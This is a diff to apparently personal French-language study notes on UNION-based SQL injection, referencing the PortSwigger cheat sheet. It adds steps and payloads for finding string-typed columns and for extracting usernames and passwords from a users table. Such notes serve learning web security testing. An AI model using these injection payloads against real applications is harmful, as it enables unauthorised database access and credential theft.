@@ -66,7 +66,7 @@ etc.
 
 Cheat Sheet dispo ici pour les BDD spécifiques : https://portswigger.net/web-security/sql-injection/cheat-sheet
 
-  2) Déterminer les types de données
+2) Déterminer les types de données
 
 Vérifier une par une les colonnes afin de vérifier s'il renvoient une chaîne de caractères :
 
@@ -74,6 +74,12 @@ Vérifier une par une les colonnes afin de vérifier s'il renvoient une chaîne 
 '+UNION+SELECT+'a',NULL,NULL--
 '+UNION+SELECT+NULL,'a',NULL--
 '+UNION+SELECT+NULL,NULL,'a'--
+etc. -> If no error in a column, then it is fine to retrieve the data.
 ```
+3) Récupérer des données sensibles
+   
+Précédemment nous avons trouver 2 colonnes de type chaîne de caractères, alors nous pouvons essayer de récupérer les données avec des noms de colonnes assez commun, comme "username" et "password" :
 
-Si nous n'avons aucune erreur dans certaines colonnes, alors nous pouvons récupérer des chaînes de caractères dans celles-ci.
+```
+'+UNION+SELECT+username,+password+FROM+users--
+```
